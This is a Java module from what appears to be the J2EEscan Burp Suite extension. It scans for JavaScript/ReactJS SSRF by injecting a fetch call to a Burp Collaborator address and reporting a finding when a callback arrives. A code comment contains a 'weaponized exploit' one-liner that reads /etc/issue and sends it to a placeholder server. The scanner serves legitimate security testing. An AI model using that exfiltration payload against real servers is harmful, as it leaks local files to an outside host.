package burp.j2ee.issues.impl;

import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

/**
 * 
 * ReactJS SSRF Scanner
 * 
 * References: 
 *   - http://10degres.net/aws-takeover-ssrf-javascript/
 * 
 *
 */
public class JavascriptSSRF implements IModule {

    private static final String TITLE = "ReactJS SSRF Scanner";
    private static final String DESCRIPTION = "J2EEscan identified a potential SSRF vulnerability";

    private static final String SSRF_REMEDY = "Execute a code review activity to mitigate the SSRF vulnerability<br />"
            + "<b>References</b>:<br /><br />"
            + "http://10degres.net/aws-takeover-ssrf-javascript/<br />"
            + "https://reactjs.org/docs/faq-ajax.html<br />"
            + "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API";

    private PrintWriter stderr;

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        stderr = new PrintWriter(callbacks.getStderr(), true);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        // weaponized exploit fetch('file:///etc/issue').then(res=>res.text()).then((r)=>fetch('https://poc.myserver.com/?r='+r));
        String payload = "fetch('https://%s')";

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

        // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
        String payloadReactSSRF = String.format(payload, currentCollaboratorPayload);

        // make a request containing our injection test in the insertion point
        byte[] checkRequest = insertionPoint.buildRequest(payloadReactSSRF.getBytes());

        
        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest);
        byte[] response = checkRequestResponse.getResponse();
        
        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions
                = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {

            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    checkRequestResponse,
                    TITLE,
                    DESCRIPTION,
                    SSRF_REMEDY,
                    Risk.High,
                    Confidence.Certain
            ));
        }

        return issues;

    }

}
